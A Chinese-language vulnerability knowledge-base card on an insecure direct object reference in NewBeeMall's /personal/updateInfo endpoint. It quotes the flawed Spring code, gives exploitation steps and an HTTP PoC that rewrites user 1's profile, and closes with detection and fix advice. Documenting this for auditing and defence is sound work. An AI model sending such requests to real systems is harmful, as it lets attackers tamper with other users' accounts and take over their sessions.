---
id: web-generic-auth-newbeemall-updateinfo-userid-idor
title: NewBeeMall /personal/updateInfo 按请求体 userId 查询并更新资料：越权修改任意用户信息
type: scenario
domain: web
path: web/generic/auth
technique: profile-update-client-userid-idor
tags:
- idor
- horizontal-privilege-escalation
- java
- spring
- profile
- newbee-mall
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:08:39+08:00'
  notes: 已对照原文与图15/16核对：@PostMapping(/personal/updateInfo) @RequestBody MallUser，service selectByPrimaryKey(mallUser.getUserId())→setNickName/setAddress/setIntroduceSign→updateByPrimaryKeySelective→重查并按 mallUser.getUserId() 写 session，未与 session 用户比对。与已有 updateuserinfo-userid-session-idor 卡（旧版两步 session 覆盖）端点相同但本文代码为按请求体 userId 直接更新，机制不同；已修正卡内边界表述。未验证点：文章未给请求/响应，未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-newbeemall-updateinfo-userid-idor/
draft: false
kb_aliases:
- NewBeeMall 个人资料越权
- updateInfo IDOR
- userId 越权修改资料
- 任意用户资料修改
- newbee-mall updateUserInfo
---

## 一句话结论

NewBeeMall 的 `POST /personal/updateInfo` 接收 `@RequestBody MallUser mallUser`，服务层直接 `selectByPrimaryKey(mallUser.getUserId())` 查出请求体指定的用户，再把昵称、地址、个性签名写回并更新；没有校验该 userId 是否等于 session 中的当前用户，攻击者传他人 userId 即可修改任意用户资料。

## 原理

- 控制器：`@PostMapping("/personal/updateInfo") @ResponseBody public Result updateInfo(@RequestBody MallUser mallUser, HttpSession httpSession)`，调用 `newBeeMallUserService.updateUserInfo(mallUser, httpSession)`。
- 服务：`MailUser user = mallUserMapper.selectByPrimaryKey(mallUser.getUserId()); if (user != null) { user.setNickName(mallUser.getNickName()); user.setAddress(mallUser.getAddress()); user.setIntroduceSign(mallUser.getIntroduceSign()); if (mallUserMapper.updateByPrimaryKeySelective(user) > 0) { ... httpSession.setAttribute(Constants.MALL_USER_SESSION_KEY, newBeeMallUserVO); return newBeeMallUserVO; } }`。
- 缺陷：更新对象由请求体的 `userId` 决定，而非 session 中的 `MALL_USER_SESSION_KEY`；代码没有比对两者，也没有校验目标用户归属。攻击者提交任意 userId 即可更新对应用户的昵称/地址/签名，并把该用户写回自己的 session（进一步以受害者身份操作）。
- 危害：任意用户资料被篡改；session 被替换为受害者后，后续请求可能以受害者身份执行（取决于其他接口是否使用 session 用户）。
- 文章只做了代码分析，未给出实际请求/响应；代码路径明确缺少归属校验，confidence 定为 medium。

## 触发条件

- 目标为 NewBeeMall，攻击者已登录任意账号。
- `/personal/updateInfo` 可达，请求体 `userId` 可控。
- 服务端按请求体 userId 查询并更新，未与 session 用户比对。

## 利用步骤

1. 登录自己的账号，获取会话。
2. 构造 JSON，`userId` 填受害者 ID，`nickName`/`address`/`introduceSign` 填任意值。
3. POST 到 `/personal/updateInfo`，服务端更新受害者资料并可能把受害者写入 session。
4. 访问受害者资料页或再次调用接口确认修改生效。

## PoC

```http
POST /personal/updateInfo HTTP/1.1
Host: target.example:28089
Cookie: JSESSIONID=<自己的会话>
Content-Type: application/json

{"userId":1,"nickName":"hacked","address":"hacked","introduceSign":"hacked"}
```

```text
# 预期：HTTP/1.1 200 成功；userId=1 的用户昵称/地址/签名被修改。
# 文章未给出该请求的实际响应，PoC 按代码路径构造。
```

## 变体与关联

- 变体：若其他资料更新接口也接收 userId/用户对象，同样可按此模式越权。
- 关联：[[web-generic-auth-newbeemall-updateuserinfo-userid-session-idor]]（同端点、同根因的已有卡）；[[web-generic-auth-newbeemall-cart-delete-idor]]（同系统购物车删除越权）；[[web-generic-auth-authenticated-change-password-idor]]（按 username 改他人密码的同类越权）。
- 边界：文章未展示实际利用请求；已有 [[web-generic-auth-newbeemall-updateuserinfo-userid-session-idor]] 卡描述旧版 session 覆盖两步链，本文代码为按请求体 userId 直接查询并更新，端点相同但机制不同。

## 检测与防御

- 检测：审计所有接收 userId/用户对象的资料更新接口，确认是否以 session 用户为准；监控请求体 userId 与 session userId 不一致的更新请求。
- 修复：更新对象必须取自 session 中的当前用户，忽略请求体 userId；若需管理员改他人资料，单独接口 + 角色校验。
- 加固：服务层方法显式传入当前用户 ID；对象级授权统一在数据访问层校验；敏感资料修改记录审计日志。
